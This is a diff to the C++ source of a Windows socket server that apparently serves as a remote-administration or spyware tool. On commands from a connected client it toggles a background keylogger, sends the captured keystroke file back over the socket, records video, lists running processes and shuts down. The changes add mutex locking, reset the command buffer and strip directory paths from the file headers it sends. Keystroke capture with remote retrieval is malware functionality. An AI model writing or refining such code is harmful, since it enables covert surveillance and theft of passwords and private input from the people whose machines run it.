@@ -7,6 +7,9 @@ Server::Server()
 
 void Server::Init()
 {
+    keylog.keyloggerON = true;
+    keylog.keyloggerRunning = false;
+    keylog.path = "";
     keyLogThread = std::thread(&keylogger::Keylogger, &keylog);
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
     {
@@ -61,7 +64,7 @@ bool Server::WaitForConnection()
         std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
         return false;
     }
-    return false;
+    return true;
 }
 
 bool Server::GetCommandFromClient()
@@ -112,25 +115,33 @@ void Server::ProcessCommand()
         {
             stopRecording();
         }
-        SendResult(videoFilePath);
+        if(!videoFilePath.empty())SendResult(videoFilePath);
     }
     else if (com == "TOGGLE_KEYLOGGER")
     {
-        keylog.keyloggerON = !keylog.keyloggerON;
-        if (keylog.keyloggerON)
-            keylog.path = "../data/keylogger/" + keylog.generate_random_string(10) + ".txt";
-        if (!keylog.keyloggerON)
+        std::lock_guard<std::mutex> lock(keylog.mtx);
+        keylog.keyloggerRunning = !keylog.keyloggerRunning;
+        if (keylog.keyloggerRunning)
         {
-            if (keyLogThread.joinable())
-            {
-                keyLogThread.join();
-            }
+            keylog.path = "../data/keylogger/" + keylog.generate_random_string(10) + ".txt";
         }
     }
     else if (com == "GET_KEYLOGGER")
     {
-        keylog.keyloggerON = false;
-        SendResult(keylog.path);
+        std::string path_to_send;
+        {
+            std::lock_guard<std::mutex> lock(keylog.mtx);
+            if (!keylog.path.empty())
+            {
+                keylog.keyloggerRunning = false;
+                path_to_send = keylog.path;
+                keylog.path = "";
+            }
+        } 
+        if (!path_to_send.empty())
+        {
+            SendResult(path_to_send);
+        }
     }
     else if (com == "GET_RUNNING_PROCESSS")
     {
@@ -158,6 +169,10 @@ void Server::ProcessCommand()
     {
         ShutDown();
     }
+    for(int i=0;i<BUFSIZ;i++)
+    {
+        command[i]='\0';
+    }
 }
 
 void Server::SendResult(const std::string path)
@@ -174,7 +189,9 @@ void Server::SendResult(const std::string path)
     std::streamsize file_size = file.tellg();
     file.seekg(0, std::ios::beg);
 
-    std::string path_header = "PATH:" + path + "\n";
+    fs::path full_path(path);
+    std::string filename_only = full_path.filename().string();
+    std::string path_header = "PATH:" + filename_only + "\n";
     std::string size_header = "SIZE:" + std::to_string(file_size) + "\n";
 
     send(clientSock, path_header.c_str(), path_header.length(), 0);
@@ -203,7 +220,8 @@ void Server::SendResult(const std::string path)
 
 void Server::DisconnectClient()
 {
-    if(clientSock == INVALID_SOCKET)return;
+    if (clientSock == INVALID_SOCKET)
+        return;
     closesocket(clientSock);
     clientSock = INVALID_SOCKET;
 }
@@ -222,7 +240,7 @@ void Server::Shutdown()
         listenSock = INVALID_SOCKET;
     }
 
-    keylog.keyloggerON=false;
+    keylog.keyloggerON = false;
     if (keyLogThread.joinable())
     {
         keyLogThread.join();
